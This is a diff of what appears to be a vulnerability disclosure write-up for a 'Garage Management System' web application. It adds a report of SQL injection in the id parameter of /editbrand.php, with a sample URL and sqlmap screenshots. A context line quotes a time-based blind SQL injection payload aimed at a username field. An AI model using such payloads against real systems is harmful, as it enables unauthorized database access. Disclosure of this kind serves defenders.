@@ -32,3 +32,16 @@ username=1@a.com' AND (SELECT 6427 FROM (SELECT(SLEEP(5)))LwLu) AND 'hsvT'='hsvT
 ### Sqlmap running results
 ![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20220719153600.png "Garage Management System")
 
+
+# 2./editbrand.php
+/editbrand.php SQL injection exists for parameter ID
+
+### Sample request POC #2
+
+```
+http://[ip:port]/editbrand.php?id=1
+```
+### Sqlmap running results
+![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20220719154113.png "Garage Management System")
+
+
